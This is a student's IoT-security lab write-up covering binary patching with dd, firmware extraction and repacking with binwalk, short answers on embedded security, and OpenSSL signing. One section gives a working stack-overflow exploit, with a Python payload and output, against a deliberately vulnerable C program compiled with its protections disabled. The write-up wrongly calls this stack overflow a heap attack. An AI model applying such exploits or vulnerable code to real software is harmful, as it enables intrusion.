# INSA - 2su : IoT security WriteUp

## A- Crack Emily


#### i) Introduction
Let's following the awesome [Emily's tutorial](https://archive.emily.st/2015/01/27/reverse-engineering/) to understand basis of reverse engineering with a simple c program   which check if the user input is a valid password or not.

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int is_valid(const char* password) {
    if (strcmp(password, "poop") == 0) { //valid password
        return 1;
    } else {
        return 0;
    }
}

int main()
{
    char* input = malloc(256);
    printf("Please input a word: ");
    scanf("%s", input);

    if (is_valid(input)) {
        printf("That's correct!\n");
    } else {
        printf("That's not correct!\n");
    }

    free(input);
    return 0;
}

```

#### ii) Analysis

By searching for more information about the file, we find it is a binary ELF for x86-64 architecture.
```bash
user@optiplex-1504:~/Documents/securiteIOT$ file program 
program: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=d1beda1d94a34542f2f73cf19d185bf96a671f0d, not stripped
```

We can start by looking for strings into the compiled binary, see above the output. 
```bash
$ strings program | less

AWAVA
AUATL
[]A\A]A^A_
poop
Please input a word: 
That's correct!
That's not correct!
;*3$"

```

Let's now understand what the code is doing, so by using `objdump -S -l -C -F -t -w program` we get 

```asm

0000000000000840 <is_valid> (Offset dans le fichier : 0x840):
is_valid():
 ...
 861:   75 07                   jne    86a <is_valid+0x2a> (Offset dans le fichier : 0x86a)
 863:   b8 01 00 00 00          mov    $0x1,%eax
 868:   eb 05                   jmp    86f <is_valid+0x2f> (Offset dans le fichier : 0x86f)
 86a:   b8 00 00 00 00          mov    $0x0,%eax
 86f:   c9                      leaveq 
 870:   c3                      retq   

0000000000000871 <main> (Offset dans le fichier : 0x871):
main():
       ...

 8ab:   e8 40 fe ff ff          callq  6f0 <__isoc99_scanf@plt> (Offset dans le fichier : 0x6f0)
 8b0:   48 8b 45 f8             mov    -0x8(%rbp),%rax
 8b4:   48 89 c7                mov    %rax,%rdi
 8b7:   e8 84 ff ff ff          callq  840 <is_valid> (Offset dans le fichier : 0x840)

       ...
 8eb:   c9                      leaveq 
 8ec:   c3                      retq   
 8ed:   0f 1f 00                nopl   (%rax)

```
The asm code provides indications about the code flow. 
* In binary offset 8b7, is_valid function is called from `main`
* In binary offset 840, `is_valid` function is defined.
* In binary offset 85a, a comparison is done `strcmp`
* Few lines after, the if statement is done 861, 868

Our goal is to return 1 on is_valid whatever the user's input. the returned value is prepared with `mov    $0x1,%eax` (move 1 into %eax) and `mov    $0x0,%eax`(move 0 into %eax => is_valid = 0). 

https://unix.stackexchange.com/questions/214820/patching-a-binary-with-dd/214824

#### iii) Patch

The patch consists in overwriting the `mov $0x0,%eax` into `mov $01,%eax`. In other words, we change only one byte at offset 2157 = 86a+3
`printf '\x01' | dd of=programNotPatched bs=1 seek=2157 count=1 conv=notrunc`

```asm
 86a:   b8 00 00 01 00          mov    $0x10000,%eax
```

> Notice: to do the same as dd with [ghidra](https://ghidra-sre.org/), we can use context menu and click on `patch instruction`



### ls' turn
> Have a look at [disassembled /sbin/ls](src/TD01/disassembled_ls.c) by Ghidra 


## B- Questions

- What are the possible attack paths on the signature of an embedded system ?
> Compared with services such as servers, softwares, cloud ..., attackers could have access to the embedded system physically. 
> For example he can retrieve the hard-codded signature (private/public) keys from the silica, he can use Man In the Middle in order to fake server authentication and read all the communication. 
> Moreover due to low memory and energy consumption limits, used algorithm to cipher are not strong enough and random generators to seed initialisation vectors are often predictable. 

- What is the chain of trust for? Why is it necessary?
> Such a chain allows to target possible points of failure / attacks in the device process. As keystone, it is relevant to protect these points for example with Devops flow
> (check source code weaknesses, build and dynamic tests), channels of communication medium (radio protection (short range transmission, frames ciphering, protocols...), protection of the third tiers (server, authentication)) and physical control (protect against physical hack, sniffing, ...).   
> Anyway through an evaluation of risks and impacts, we can score the relevancy of such attack.   
- Describe the method for approaching security on an embedded product. Why is establishing an attacker model important?
> First identify if the solution is a product or a service, then establish the attacker model to adapt security with some counter-measures. An other point of failure is the data flow, indeed.

- Find a quick way to do embedded debugging (for example on ARM target)? Explain the benefits
> First it is more confortable for a dev to code on his computer (more tools, GUI, IDEs ..). At this time, using emulator such as qemu allow to compile and execute faslty without uploading the firmware on the device. Because of emulation, the computer has to do architecture translation (arm, x86, risc ..), making more slowly the execution than into real device.    
> Moreover JTAG can be used for debugging directly while executing on embedded system, but pay attention to deactivate dev functions for the production stage.


- List possible bug categories and how to exploit and defend them
> Buffers overflow ; 

- What ideas to improve on-board security? (AI, Anti-debug, Obfuscation, Crypto ...) Choose an idea, search if it exists and develop in a few sentences what advantage it brings and its limits exploit and defend them
> Devops, industrial processing, remote debugging... https://github.com/aws/aws-fpga ; 
> Because i'm interested in devops' processing, let's have a look at solutions to enhance iot security. The first step is to reduce bugs mainly thanks to log reporting and the key is centralisation. I think cloud's architecture could help to remotely debug devices and with OTA's updates (Over the Air) ensure security concerns fastly.
> Let's focus on running tests for the iot ; indeed the use of cloud to build and compute on real devices most of the tests will reduce bugs and by the way security issues. 
> As example I applied my last internship at equensWorldline with a team working on strong authentication for mobile solutions ; they use an opensource platform openstf to manage and deploy applications on remote Android devices. Using such a platform instead of emulators the observed behoviour is more faithful with the realworld.

> Here let's me introduce yourself a similary solution for FPGAs (Field Programmable Gate Array) available from the Amazon Cloud platform where you can [rent instances](https://aws.amazon.com/fr/ec2/instance-types/f1/). Giving the opportunity to access such expensive devices to run tests should contribute to generalise good practices and enhance the chain of trust.

## C- Where is tux ?

### 0- Run the code
After downloading the firmware image `vmlinuz-qemu-arm-2.6.20`, we can start it with Qemu (ARM arch)
```bash
$ qemu-system-arm -M versatilepb -m 16 -kernel vmlinuz-qemu-arm-2.6.20-orinal -append "clocksource=pit quiet rw"
```

Into the VM, pay attention to the `qwerty` keyboard to execute:
```bash
$ run_demo
```

Then, you will be tux everywhere in the foreground.

### 1- Let's find where our friend is hidden ...
By using `binwalk` tool, we can analyse the firmware content (-Me for recursive mode). We are looking for a png type, so the option `-dd "png image:png"` can help to filter results.

```bash
$ binwalk -MeD "png image:png" vmlinuz-qemu-arm-2.6.20-original

Scan Time:     2020-02-14 12:42:22
Target File:   /home/user/Téléchargements/vmlinuz-qemu-arm-2.6.20-orinal
MD5 Checksum:  5c8a1c2f291db79915eb2fb0eda1ebbe
Signatures:    396

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Linux kernel ARM boot executable zImage (little-endian)
12720         0x31B0          gzip compressed data, maximum compression, from Unix, last modified: 2007-05-09 06:03:48


Scan Time:     2020-02-14 12:42:23
Target File:   /home/user/Téléchargements/_vmlinuz-qemu-arm-2.6.20-orinal-4.extracted/31B0
MD5 Checksum:  00f36d76c384709b0a6ca5cb93e25c0e
Signatures:    396

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
58971         0xE65B          LZMA compressed data, properties: 0xC0, dictionary size: 0 bytes, uncompressed size: 3223117372 bytes
59360         0xE7E0          gzip compressed data, maximum compression, from Unix, last modified: 2007-05-09 06:02:29
1851243       0x1C3F6B        LZMA compressed data, properties: 0x64, dictionary size: 0 bytes, uncompressed size: 51539607552 bytes
[..]
2562660       0x271A64        CRC32 polynomial table, little endian

[..]

Scan Time:     2020-02-14 12:42:26
Target File:   /home/user/Téléchargements/_vmlinuz-qemu-arm-2.6.20-orinal-4.extracted/_31B0.extracted/E7E0
MD5 Checksum:  a87565b1913f211274dd18653451483c
Signatures:    396

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
[..]
2984412       0x2D89DC        ASCII cpio archive (SVR4 with no CRC), file name: "/usr/local/share/directfb-examples/tux.png", file name length: "0x0000002B", file size: "0x00006050"
3009224       0x2DEAC8        ASCII cpio archive (SVR4 with no CRC), file name: "/usr/local/share/directfb-examples/wood_andi.jpg", file name length: "0x00000031", file size: "0x0000F327"


[..]

```

Here we can see the path to our friend : `/usr/local/share/directfb-examples/tux.png` at offset `0x2D89DC` of the gzip content: `0xE7E0` 

#### a) The noob way
By executing the last command with binwalk, a folder `__vmlinuz-qemu-arm-2.6.20-orinal.extracted` has been created.    
Here we can find : `_31B0.extracted/_E7E0.extracted`  and the image file : `/home/user/Téléchargements/_vmlinuz-qemu-arm-2.6.20-orinal-4.extracted/_31B0.extracted/_E7E0.extracted/cpio-root/usr/local/share/directfb-examples/tux.png`

#### b) The hard way
The idea is to walk into the firmware to identify offsets and extract content with `dd`.   

```bash
$ binwalk ./vmlinuz-qemu-arm-2.6.20-orinal 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Linux kernel ARM boot executable zImage (little-endian)
12720         0x31B0          gzip compressed data, maximum compression, from Unix, last modified: 2007-05-09 06:03:48
```

Let's extract and unzip the gzip compressed data located at offset `0x31B0`.
```
$ dd if=vmlinuz-qemu-arm-2.6.20-orinal of=31B0.gz bs=1 skip=$((0x31B0))
$ gunzip 31B0.gz

$ binwalk 31B0

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
58971         0xE65B          LZMA compressed data, properties: 0xC0, dictionary size: 0 bytes, uncompressed size: 3223117372 bytes
59360         0xE7E0          gzip compressed data, maximum compression, from Unix, last modified: 2007-05-09 06:02:29
[...]
2562660       0x271A64        CRC32 polynomial table, little endian
[...]
```

Then, do the same with the compressed data located at offset `0xE7E0`
```bash
$ dd if=31B0 of=e7e0.gz skip=$((0xE7E0)) bs=1 count=$(( $((0x1C3F6B)) - $((0xE7E0)) +1  ))
$ file e7e0.gz
e7e0.gz: gzip compressed data, last modified: Wed May  9 06:02:29 2007, max compression, from Unix

$ gunzip e7e0.gz
$ file e7e0
e7e0: ASCII cpio archive (SVR4 with no CRC)

$ binwalk e7e0 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
[..]
2984412       0x2D89DC        ASCII cpio archive (SVR4 with no CRC), file name: "/usr/local/share/directfb-examples/tux.png", file name length: "0x0000002B", file size: "0x00006050"
3009224       0x2DEAC8        ASCII cpio archive (SVR4 with no CRC), file name: "/usr/local/share/directfb-examples/wood_andi.jpg", file name length: "0x00000031", file size: "0x0000F327"
[..]

```

To finish, we can extract the cpio archive

```bash
$ dd if=e7e0 of=tux-cpio bs=1 skip=$((0x2D89DC)) count=$(( $((0x2DEAC8 )) - $((0x2D89DC )) +1  ))
$ file tux-cpio
tux-cpio: ASCII cpio archive (SVR4 with no CRC)
```

And sync with our local fs:
```bash
$ cpio --make-directories -i -F tux-cpio
$ gimp /usr/local/share/directfb-examples/tux.png
```

Here is the win !

find . -iname *.c -print | cpio -ov >/tmp/c_files.cpio
![tux](src/tux.png)

### 2- Repack our new Tux
First, with cpio we recreate a well formated object (`H newc` for SVR4 without CRC format)
![ntux](src/ntux.png)
```bash
$ find /usr/local/share/directfb-examples/tux.png | cpio -o -H newc > ./ntux-cpio
$ file ntux-cpio
ntux-cpio: ASCII cpio archive (SVR4 with no CRC)
```

And replace in the main cpio archive at 0xe7e0 (patch and compress)

```bash
$ dd if=ntux-cpio of=e7e0 seek=$((0x2D89DC)) bs=1 conv=notrunc count=$(( $((0x2DEAC8 )) - $((0x2D89DC )) +1  ))
$ gzip e7e0
$ file e7e0.gz
e7e0.gz: gzip compressed data, was "e7e0", last modified: Fri Feb 14 14:15:38 2020, from Unix
```


```bash
$ dd if=e7e0.gz of=31B0 seek=$(( 0xe7e0 )) count=$(( $(( 0x1C3F6B )) - $(( 0xe7e0 )) )) bs=1
$ gzip 31B0
$ file 31B0.gz
31B0.gz: gzip compressed data, was "31B0", last modified: Fri Feb 14 14:22:09 2020, from Unix
```

```bash
$ dd if=31B0.gz of=vmlinuz-qemu-arm-2.6.20-hacked seek=$((0x31b0)) bs=1

$ binwalk -e vmlinuz-qemu-arm-2.6.20-hacked 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Linux kernel ARM boot executable zImage (little-endian)
12720         0x31B0          gzip compressed data, has original file name: "31B0", from Unix, last modified: 2020-02-14 14:22:09
```

Let's test out repacked firmware image...
```bash
$ qemu-system-arm -M versatilepb -m 16 -kernel vmlinuz-qemu-arm-2.6.20-hacked -append "clocksource=pit quiet rw"
pulseaudio: set_sink_input_volume() failed
pulseaudio: Reason: Invalid argument
pulseaudio: set_sink_input_mute() failed
pulseaudio: Reason: Invalid argument
```
Unfortunately qemu stucks into black screen, In fact I suppose that it is due to a checksum issue. We should recalculate the CRC32 table after modifying our binary !


## D - Hack the heap

In order to understand how to hack the heap behaviour with buffer overflow, this part has been realised with [this step-by-step explained tuto](https://dhavalkapil.com/blogs/Buffer-Overflow-Exploit/)

### a - code sample
```c
#include <stdio.h>

void secretFunction()
{
    printf("Congratulations!\n");
    printf("You have entered in the secret function!\n");
    printf("Let's find here a Reverse shell .. ie \n");
}

void echo()
{
    char buffer[20];
    printf("Enter some text:\n");
    scanf("%s", buffer);
    printf("You entered: %s\n", buffer);
}

int main()
{
    echo();
    return 0;
}

// 
// 
// to compile : $ gcc demo-heap.c -o vuln -m32 -fno-stack-protector -z execstack -no-pie
// exploit heap  = $ python -c 'print "a"*32 + "\x8b\x84\x04\x08"' | ./vuln
// OUtput
/*
    You entered: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa��
    Congratulations!
    You have entered in the secret function!
    Let's find here a Reverse shell .. ie
    Erreur de segmentation
 */

/*
 * secretFunction address (hidra) = 0804848b
 */

```
> *explanation:*  the goal of this PoC is to execute the hidden function `secretFunction`

### b - compile and analyse
According to [this forum discussion](https://stackoverflow.com/questions/2340259/how-to-turn-off-gcc-compiler-optimization-to-enable-buffer-overflow), we have to compile with additional options to deactivate memory protection and force 32-bit architecture.
`$ gcc demo-heap.c -o vuln -m32 -fno-stack-protector -z execstack -no-pie`
Now, thanks to objdump, we can read the adress of `secretFunction` at offset `0x804848b`. In the "echo" function, a scanf is used to read user's input and place the content into `buffer` pointer. At the end of the function, the retq primitive jump to the parent caller `main` whose address is stored in the heap.

### c - exploit
We can overwrite the heap with the address of our hidden function :   
```bash
$ python -c 'print "a"*32 + "\x8b\x84\x04\x08"' | ./vuln
You entered: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa��
    Congratulations!
    You have entered in the secret function!
    Let's find here a Reverse shell .. ie
    Erreur de segmentation
```

### d - how to protect
In fact, we had to deactivate heap security for compilation ; so don't do that ! The virtual memory protect the stack with canary to ensure no one is hacking it !

## E - Fuzzing
Let's reuse the code of the part A (Crack Emily) and design a script to rewrite (one bit a time) the binary in order to get a patched version (ie: OK whatever the input)
### notes:
Even if we apply such a script on the desired range ( `0x861-0x870` ), the number of possibilities is too important (at least 255^14 = 4,9154414350646441771130432128906e+33).   
To conclude, a bruteforce approche will never end ! Maybe smarter system such as AI or genetic algorithms could help.

## F - Sign binaries
Get starting by the generation of our self-signed certificate.
```bash
$ openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
Generating a RSA private key
.........................................+++++
........................................................+++++
writing new private key to 'key.pem'
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:FR
State or Province Name (full name) [Some-State]:Centre Val de Loire
Locality Name (eg, city) []:Bourges
Organization Name (eg, company) [Internet Widgits Pty Ltd]:Institut National des Sciences Appliquées
Organizational Unit Name (eg, section) []:2su
Common Name (e.g. server FQDN or YOUR name) []:gpineda
```

Then, we can extract our publicKey from the certificate and private key:
```bash
$ openssl x509 -in .\certificate.pem -noout -text
Certificate:
    Data:
        Version: 3 (0x2)
        Serial Number:
            5a:c1:2c:3d:f8:50:e4:f0:45:e4:cf:61:5e:ad:f8:b5:c7:09:8a:90
        Signature Algorithm: sha256WithRSAEncryption
        Issuer: C = FR, ST = Centre Val de Loire, L = Bourges, O = Institut National des Sciences Appliqu\C2\82es, OU = 2su, CN = gpineda, emailAddress = guillaume.pineda@insa-cvl.fr
        Validity
            Not Before: Feb 21 18:08:24 2020 GMT
            Not After : Feb 20 18:08:24 2021 GMT
        Subject: C = FR, ST = Centre Val de Loire, L = Bourges, O = Institut National des Sciences Appliqu\C2\82es, OU = 2su, CN = gpineda, emailAddress = guillaume.pineda@insa-cvl.fr
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                RSA Public-Key: (2048 bit)
                Modulus:
                    00:cc:9f:fc:da:9c:26:01:39:66:48:75:0b:b3:45:
                    9d:66:c1:c1:b0:c8:08:8c:ec:d0:8d:0e:39:0b:3f:
                    1e:ba:9f:a6:8e:ea:33:1c:3c:15:f9:06:b6:29:55:
                    dd:43:99:17:b5:35:24:34:76:53:8f:e3:a2:ed:ad:
                    81:1f:f7:99:7c:82:0b:8f:94:b5:d3:30:6f:83:bc:
                    ba:2e:30:81:f0:01:ce:6f:3a:ab:b8:e5:87:ef:e7:
                    cc:de:08:83:f2:28:7b:c5:97:33:d8:cb:45:b8:9a:
                    67:d5:4f:eb:51:9f:ee:a4:3e:4f:3e:40:e1:5f:a4:
                    07:fd:b7:ac:d1:1e:3f:19:5a:63:e6:21:35:11:78:
                    68:37:00:d9:41:ea:16:f7:c4:5e:c6:f0:87:b8:6c:
                    f8:27:34:15:09:75:cd:db:06:f7:49:29:59:b7:ff:
                    18:22:4b:5a:90:cb:5f:f5:77:97:db:bb:56:97:2d:
                    c5:ee:79:30:5c:3d:17:ac:a4:ca:9b:03:d2:d4:54:
                    4f:00:c5:1f:db:53:07:92:cd:9f:da:43:90:7d:b6:
                    76:df:d8:da:d6:ad:5a:a2:61:e9:60:4a:19:29:25:
                    02:42:d2:af:43:59:01:43:a7:6c:bc:03:59:0a:95:
                    9e:fd:d5:0b:e5:d4:40:9f:e9:5e:da:78:3e:4a:d3:
                    52:2d
                Exponent: 65537 (0x10001)
        X509v3 extensions:
            X509v3 Subject Key Identifier:
                98:79:7F:C3:4A:46:0C:4C:72:8C:C2:E6:4A:A6:F3:B9:FB:CA:FC:17
            X509v3 Authority Key Identifier:
                keyid:98:79:7F:C3:4A:46:0C:4C:72:8C:C2:E6:4A:A6:F3:B9:FB:CA:FC:17

            X509v3 Basic Constraints: critical
                CA:TRUE
    Signature Algorithm: sha256WithRSAEncryption
         88:85:34:57:cd:38:fc:34:d2:e3:dc:f0:20:46:49:9e:08:fb:
         be:10:43:40:d0:22:a5:96:2f:4b:2f:d0:00:ee:e7:83:91:e3:
         8a:3b:46:92:3b:61:1c:df:1c:3f:6c:29:8f:65:7b:af:bc:8d:
         23:2f:fc:a0:8b:87:15:26:71:82:4a:53:28:9e:48:91:fb:d8:
         74:ca:9f:03:8e:64:11:bd:f9:76:40:54:96:49:2a:5f:38:5c:
         b9:dd:9d:bb:d7:96:23:e1:a5:19:0f:02:19:c3:84:49:97:ad:
         42:43:a2:ac:46:3e:f9:ee:a9:80:3f:69:3e:b2:d6:2b:bb:0b:
         59:22:11:fa:37:54:c6:e2:95:a0:d1:0d:62:23:9f:eb:c2:3e:
         4e:0d:89:ee:82:0b:54:8e:6b:bd:fd:77:52:2f:ad:00:a1:81:
         17:ff:05:df:73:c9:12:fa:61:b3:a4:b7:7f:cd:94:04:00:ae:
         75:5c:e8:f2:7d:7c:6b:c7:6d:d2:bd:b3:3a:82:73:97:a3:08:
         5b:4f:d1:3d:f8:49:6e:30:54:99:dd:67:a2:91:1d:58:3c:30:
         f2:73:1f:af:5f:75:2a:98:88:2a:92:7a:74:93:33:8a:d4:5a:
         fb:fc:78:a5:23:1d:59:18:93:4e:9c:e6:a7:47:60:42:6b:4d:
         7d:ce:f6:89
$ openssl x509 -pubkey -noout -in .\certificate.pem  > pubkey.pem
$ cat .\pubkey.pem
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAzJ/82pwmATlmSHULs0Wd
ZsHBsMgIjOzQjQ45Cz8eup+mjuozHDwV+Qa2KVXdQ5kXtTUkNHZTj+Oi7a2BH/eZ
fIILj5S10zBvg7y6LjCB8AHObzqruOWH7+fM3giD8ih7xZcz2MtFuJpn1U/rUZ/u
pD5PPkDhX6QH/bes0R4/GVpj5iE1EXhoNwDZQeoW98RexvCHuGz4JzQVCXXN2wb3
SSlZt/8YIktakMtf9XeX27tWly3F7nkwXD0XrKTKmwPS1FRPAMUf21MHks2f2kOQ
fbZ239ja1q1aomHpYEoZKSUCQtKvQ1kBQ6dsvANZCpWe/dUL5dRAn+le2ng+StNS
LQIDAQAB
-----END PUBLIC KEY-----
```

Then calculate hash and sign it !
```bash
$ cat .\hello.txt
Hey,
This content is private and has to be protected against modifications by authentifying the writter !
$ openssl dgst -sha256 hello.txt > hash
$ cat .\hash
SHA256(hello.txt)= 029ce541f200dee747778d646db55087fd09c190edfa36b98db17c6096745e1b
$ openssl rsautl -sign -inkey key.pem -keyform PEM -in hash > signature
$ cat .\signature
¼D▀$
Í░öÀ░ÆÉÂ6┤ÈÑ0&Â!¸j*Ïá¯ç6█À¦çspq─Ö×²Áyp═▓█Ä┼ü▄k:.ß¡╦┤ÚVþ┬µ//┤îæM█·┴]Á? ãöÃ¹$┌èê\Â©Ôw╬¥Çï®Ë¥·‗ª~Ç!àÐÎ'·QµÅ|█¶yt@%îK║!óRw÷5├LÔ░┤Ð┌b┌\G¡Të┌Æ$$ (,Ìñ®Ç╚S_Ù,┘ËCfþîè»├Û#ÈQ¨Ó¿±¬z©¨Ûãê}¸▓u¬fª1ÓÔÞ÷<¿╗▓®ÍðÿÝ,│fÐ@╝\D
0       yÄ/æìz<¨└ù
```
-- to be continued --

### use case
Signing a binary could help to ensure an update integrity by storing the certificate securely into the device and signing updates with the company's private key. However a man in the middle is possible and to avoid it a shared challenge could be solved (like Diffie Hellman)
